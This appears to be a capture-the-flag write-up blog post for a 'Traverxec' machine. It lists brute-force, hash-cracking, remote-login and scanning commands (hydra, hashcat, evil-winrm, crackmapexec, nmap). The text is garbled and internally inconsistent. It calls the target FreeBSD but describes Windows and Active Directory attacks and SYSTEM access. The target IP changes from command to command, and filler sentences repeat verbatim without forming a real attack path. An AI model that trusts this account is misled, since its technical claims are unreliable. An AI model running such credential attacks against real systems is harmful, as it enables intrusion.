---
TitleSEO: "PwnTillDawn — Traverxec (Easy FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — Traverxec (Easy FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Traverxec. SSRF and DCSync to achieve easy compromise on FreeBSD."
Keywords: "linux, ctf, hard, medium, web"
URL: "https://zurefx.github.io/writeups/htb-traverxec-829.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-traverxec-829/"
Date: "2025-01-06"
Tags: "Linux, CTF, Hard, Medium, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-traverxec-829"
Permalink: "/writeups/htb-traverxec-829.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Traverxec** is rated **Easy** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.29.242.251`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
feroxbuster -h
evil-winrm -i 10.13.154.158 -u administrator -p 'P@ssw0rd!'
```

The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

### Service Enumeration

The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.31.46.25 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.157.131 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

### Web Enumeration

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

```bash
evil-winrm -i 10.36.47.97 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.19.69.67 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.51.252.169 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.98.230 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

Key finding: **SSRF**.

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

### Initial Access

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.52.200.145 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5432,8080,9200 10.121.172.172 -oN scan.txt
nmap -sCV -p464,110,8080 10.108.15.123 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

```powershell
nmap -sCV -p464,21,636 10.91.53.141 -oN scan.txt
crackmapexec smb 10.34.188.165 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.15.89.76 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.109.100.151/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `kerbrute`
- `sqlmap`
- `netcat`
- `nmap`
- `GetUserSPNs`

### Key Takeaways

- SSRF
- DCSync
- SUID Binary
- Writable PATH
